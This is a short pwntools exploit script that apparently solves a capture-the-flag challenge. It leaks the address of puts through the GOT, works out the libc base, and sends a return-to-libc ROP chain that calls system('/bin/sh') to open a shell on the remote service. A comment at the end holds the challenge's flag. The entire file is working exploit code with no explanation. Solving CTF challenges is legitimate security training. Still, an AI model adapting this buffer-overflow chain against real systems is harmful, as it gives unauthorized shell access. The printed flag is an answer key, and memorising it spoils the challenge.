
from pwn import *

r = remote('chall.nitdgplug.org', 30081)
# r = process('./chall')
libc = ELF('./libc6-i386_2.23-0ubuntu11.2_amd64.so')

puts_off = libc.sym['puts']

pop_rbx = 0x08049022 #: pop ebx; ret; 
got_puts = 0x0804C014
plt_puts = 0x080490A4
main = 0x08049213

p = b'A' * 52
p += p32(plt_puts)
p += p32(pop_rbx)
p += p32(got_puts)
p += p32(main)

r.recvline()
r.recvline()
r.sendline(p)

x = r.recv().split()
LIBC_BASE = int.from_bytes(x[0][:4], byteorder='little') - puts_off
ADDR_BINSH = next(libc.search(b'/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols['system'] + LIBC_BASE

p = cyclic(52)
p += p32(ADDR_SYSTEM)
p += p32(0x0)
p += p32(ADDR_BINSH)

r.sendline(p)

r.interactive()

# GLUG{r0p1ng_4nd_win1ng_ri8_5d0adfbeacbfe153}